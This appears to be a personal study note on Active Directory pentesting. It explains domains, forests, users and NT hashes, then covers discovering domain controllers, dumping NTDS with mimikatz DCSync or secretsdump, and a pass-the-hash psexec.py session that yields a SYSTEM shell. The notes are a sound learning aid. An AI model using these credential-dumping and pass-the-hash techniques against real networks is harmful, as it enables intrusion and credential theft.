---
share_link: https://share.note.sx/1earvyrf#WIaKgX0OfIfF5w7Nra2hCmY8G++7e168GYf2tFDrn24
share_updated: 2024-11-12T18:10:39+05:30
---

## **WHAT IS AD?**

- A Network with Centralized Database which contains information about users, computers, policies, permissions etc..

- The IT Team has the access to the Workstation (Main Centralized DATABASE)

- Eg : 
	- sales department requires a new program to be installed in their workstations ?
	- When users forget their passwords, the IT team can reset passwords centrally, even for users in different office locations.
	- For a new group of interns, the IT team can configure permissions so they only have access to specific documents on a file server, ensuring secure and limited access.



## **Domains** 

- set of connected computer shares AD Database (Managed by Centralized server also called Domain Controller)

 **Domain name**

- Each domain has a DNS name
- name of the domain is the same as their web site `contoso.com`

```powershell
PS C:\Users\Anakin> $env:USERDNSDOMAIN
CONTOSO.LOCAL
PS C:\Users\Anakin> (Get-ADDomain).DNSRoot
contoso.local
PS C:\Users\Anakin> (Get-WmiObject Win32_ComputerSystem).Domain
contoso.local
```

- every domain can also be identified with NetBIOS name

- domain can be identified by its **SID**

```powershell
PS C:\Users\Anakin> Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID

DNSRoot       NetBIOSName DomainSID
-------       ----------- ---------
contoso.local CONTOSO     S-1-5-21-1372086773-2238746523-2939299801
```



## Forests

- DNS allows to create subdomains for management purposes
- a company can have a **root domain** called `contoso.local` subdomains for different departments, like `it.contoso.local` or `sales.contoso.local`. 

```

              contoso.local
                    |
            .-------'--------.
            |                |
            |                |
     it.contoso.local hr.contoso.local
            | 
            |
            |
  webs.it.contoso.local

```

- tree of domains is known as [**Forest**](https://docs.microsoft.com/en-us/windows/win32/ad/forests)
- name of the forest is the same as the name of the root domain


```powershell
PS C:\Users\Anakin> Get-ADForest


ApplicationPartitions : {DC=DomainDnsZones,DC=contoso,DC=local, DC=ForestDnsZones,DC=contoso,DC=local}
CrossForestReferences : {}
DomainNamingMaster    : dc01.contoso.local
Domains               : {contoso.local}
ForestMode            : Windows2016Forest
GlobalCatalogs        : {dc01.contoso.local, dc02.contoso.local}
Name                  : contoso.local
PartitionsContainer   : CN=Partitions,CN=Configuration,DC=contoso,DC=local
RootDomain            : contoso.local
SchemaMaster          : dc01.contoso.local
Sites                 : {Default-First-Site-Name}
SPNSuffixes           : {}
UPNSuffixes           : {}
```


- each domain has its own database and its own Domain Controllers
- users of a domain in the forest can also access to the other domains within forest


### Trusts

- users can access to other domains in the same forests via Trust (a connection)
- a kind of authentication/authorization connection (using kerbros , LM )



### Users

- key points for using Active Directory is the users management
- stored as a objects in the central [database](https://zer1t0.gitlab.io/posts/attacking_ad/#database)

#### User properties

- fetched using Username or SID can be used to iden user
- user SID = Domain SID + user RID


```powershell
PS C:\Users\Anakin> Get-ADUser Anakin


DistinguishedName : CN=Anakin,CN=Users,DC=contoso,DC=local
Enabled           : True
GivenName         : Anakin
Name              : Anakin
ObjectClass       : user
ObjectGUID        : 58ab0512-9c96-4e97-bf53-019e86fd3ed7
SamAccountName    : anakin
SID               : S-1-5-21-1372086773-2238746523-2939299801-1103
Surname           :
UserPrincipalName : anakin@contoso.local
```


# User Secrets


#### LM/NT Hashes

- **Hash Creation and Use**:
    
    - Windows generates two hashes (LM and NT) when a password is set.
    -  **LM is disabled by default** in modern systems due to its weakness.
    -  **NT hashes are calculated and used** by default in modern Windows systems.
- **Login Authentication**:
    
    -  Either **LM or NT hash alone is sufficient** to authenticate, provided LM is enabled.
    - LM hashes are weak and can be cracked easily if available.
- **Storage**:
    
    -  Both LM and NT hashes, when calculated, are stored in the **SAM** (for local accounts) and **NTDS** (for domain accounts on Domain Controllers).
    -  Hashes in SAM are in the format `<username>:<RID>:<LM Hash>:<NT Hash>:::`.
    -  `aad3b435b51404eeaad3b435b51404ee` represents the LM hash of an **empty string** and often appears when LM is disabled.

#### Kerberos Keys

- [KERB AUTH FLOW](obsidian://open?vault=Spidey_Notes&file=HTB%2FAD%2FKERBEROS%20AUTH)

![[Pasted image 20241110163048.png]]






# Domain Controllers - DISCOVERY

- central server of a domain
- Database file `C:\Windows\NTDS\ntds.dit`
- discovering DC is important in AD
- How to discover DC ?
	- **DNS query asking for the LDAP servers** 

	 ```powershell
	PS C:\Users\Anakin> nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local
	Server:  UnKnown
	Address:  192.168.100.2
	
	_ldap._tcp.dc._msdcs.contoso.local      SRV service location:
	          priority       = 0
	          weight         = 100
	          port           = 389
	          svr hostname   = dc01.contoso.local
	_ldap._tcp.dc._msdcs.contoso.local      SRV service location:
	          priority       = 0
	          weight         = 100
	          port           = 389
	          svr hostname   = dc02.contoso.local
	dc01.contoso.local      internet address = 192.168.100.2
	dc02.contoso.local      internet address = 192.168.100.3
```

- using nltest

```powershell
PS C:\Users\Anakin> nltest /dclist:contoso.local
Get list of DCs in domain 'contoso.local' from '\\dc01.contoso.local'.
    dc01.contoso.local [PDC]  [DS] Site: Default-First-Site-Name
    dc02.contoso.local        [DS] Site: Default-First-Site-Name
The command completed successfully
```




- now DC database contains sensitive info ==ATTACKER TARGET==


#### Domain database dumping


**LOCAL**

- get administrator of the domain  -> log in on the domain controller
- use  [ntdsutil](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)) or [vssadmin](https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/vssadmin) to dump 

**Remote**

- this case too needs admin access means password or hash
- with the [mimikatz lsadump::dsync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync)
-  [impacket secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) script



# Windows computers - DISCOVERY

- LDAP OPEN ? HAVING LDAP CREDS ?

```powershell
 ldapsearch -H ldap://192.168.100.2 -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem"
Enter LDAP Password: 
dn: CN=DC01,OU=Domain Controllers,DC=contoso,DC=local
operatingSystem: Windows Server 2019 Standard Evaluation
dNSHostName: dc01.contoso.local

dn: CN=WS01-10,CN=Computers,DC=contoso,DC=local
operatingSystem: Windows 10 Enterprise
dNSHostName: ws01-10.contoso.local

dn: CN=WS02-7,CN=Computers,DC=contoso,DC=local
operatingSystem: Windows 7 Professional
dNSHostName: WS02-7.contoso.local

dn: CN=SRV01,CN=Computers,DC=contoso,DC=local
operatingSystem: Windows Server 2019 Standard Evaluation
dNSHostName: srv01.contoso.local
```

- NBNS (port 137) open , no creds needed !
	- [nbtscan](http://www.unixwiz.net/tools/nbtscan.html) or nmap [nbtstat](https://nmap.org/nsedoc/scripts/nbstat.html) script

```powershell
$ nbtscan 192.168.100.0/24
192.168.100.2   CONTOSO\DC01                    SHARING DC
192.168.100.7   CONTOSO\WS02-7                  SHARING
192.168.100.10  CONTOSO\WS01-10                 SHARING
*timeout (normal end of scan)
```


# Windows computers connection

- RPC open (port 135) use  [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) 
-  445 port (SMB) open  use impacket psexec

```powershell
$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 192.168.100.10.....
[*] Found writable share ADMIN$
[*] Uploading file WFKqIQpM.exe
[*] Opening SVCManager on 192.168.100.10.....
[*] Creating service AoRl on 192.168.100.10.....
[*] Starting service AoRl.....
[!] Press help for extra shell commands
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) Microsoft Corporation. All rights reserved.
b'Not enough memory resources are available to process this command.\r\n'
C:\Windows\system32>whoami
nt authority\system
```


- now NT hash is used as PtH , is Kerberos authentication is used PtT attack happens


- 
